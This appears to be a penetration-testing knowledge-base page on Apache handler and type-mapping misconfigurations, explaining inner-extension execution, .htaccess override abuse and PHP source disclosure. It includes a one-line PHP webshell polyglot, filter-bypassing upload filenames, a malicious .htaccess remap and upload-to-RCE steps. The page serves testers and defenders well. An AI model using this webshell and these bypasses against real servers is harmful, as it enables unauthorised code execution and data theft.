---
title: "Apache handler and type mapping: executing or disclosing the wrong files"
order: 1
description: "Exploiting Apache AddHandler/AddType/SetHandler mistakes: inner-extension execution, SetHandler over a directory, missing-handler source disclosure, .htaccess override abuse, and double-extension upload execution."
keywords:
  - AddHandler
  - AddType
  - SetHandler
  - htaccess
  - double extension
  - php source disclosure
---

# Handler and type mapping

Apache decides how to process a file from its extension via `AddHandler`, `AddType`, and `SetHandler`. Loose or wrong mappings cause two opposite failures: inert files get **executed**, or executable files get **served as source**. Both are pure configuration bugs.

## Over-broad execution (inner extension)

Apache matches `AddHandler`/`AddType` against *any* extension in the filename, not just the last one:

```apache
AddHandler application/x-httpd-php .php
AddType application/x-httpd-php .php
```

With this, `shell.php.jpg` is handled as PHP because `.php` appears in the name. An upload filter that only checks the final extension (`.jpg`) lets an executable file through. This is the server half of double-extension upload execution.

Broader still, `SetHandler application/x-httpd-php` inside a `<Directory>`/`<Location>` covering an uploads or data directory executes *every* file there regardless of extension.

## Double-extension upload execution

When the handler matches an inner extension but the upload filter validates only the last, a double extension satisfies both. Alternate PHP extensions also dodge denylists:

```
shell.php.jpg      shell.phar.png     shell.pHp
shell.phtml        shell.pht          shell.php5     shell.php7
```

Pair with a polyglot so a content sniff or `getimagesize` passes:

```
GIF89a;<?php system($_GET['c']); ?>
```

Then locate the stored file (often via [directory listing](../general/directory-listing.md)) and request it.

## .htaccess override abuse

Where `AllowOverride` permits it and a directory is writable (an uploads folder), an attacker uploads their own `.htaccess` to remap a benign extension to the PHP handler:

```apache
AddType application/x-httpd-php .jpg
# now any uploaded .jpg in this directory runs as PHP
```

Uploading this `.htaccess` next to an image webshell is a classic upload-to-RCE when direct script upload is blocked. Variants set `php_value`/`php_flag` (for example `auto_prepend_file`) to influence the runtime from the directory.

## Source disclosure from a missing handler

The inverse exposes source. A location where the PHP handler is not wired (a `RemoveHandler`/`SetHandler None`, a disabled module after an upgrade, or a `.phps`/`text/plain` mapping) returns raw script bytes:

```apache
<FilesMatch "\.php$">
    SetHandler None
</FilesMatch>
```

Requesting any `.php` then discloses source and secrets, commonly seen transiently right after a PHP upgrade removes the handler.

## Exploitation

- Upload/place `name.php.<allowed-ext>` and request it; execution confirms the handler matched the inner `.php`.
- If uploads land where `AllowOverride` is on, plant a `.htaccess` to remap an extension.
- Probe known scripts for raw `<?php` in the response to catch source disclosure.

## Tools

- Burp (upload fuzzing); content-discovery tooling; polyglot builders.

## References

- Apache httpd: mod_mime (AddHandler/AddType), SetHandler, AllowOverride
- OWASP: Unrestricted file upload
